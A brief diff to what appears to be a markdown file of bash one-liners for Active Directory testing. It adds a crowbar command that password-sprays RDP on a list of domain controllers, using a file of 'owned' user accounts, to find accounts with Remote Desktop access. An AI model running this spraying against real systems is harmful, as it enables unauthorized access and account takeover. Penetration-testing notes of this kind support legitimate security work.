@@ -6,4 +6,8 @@ The below bash oneliner script reads each line of text file and ping echo, and r
 while IFS= read -r line; do ping -c 1 $line; done <list-domain-controllers.txt | grep 'PING'
 ```
 
+Using crowbar to spray passowrd with list of accounts and validate if any user in list have access to Remote Desktop.  
+```bash
+while IFS= read -r line; do crowbar -b rdp -U owned-useraccounts.txt -c 'password' -s $line; done <list-dc-ip.txt
+
 More bash scripts too follow    
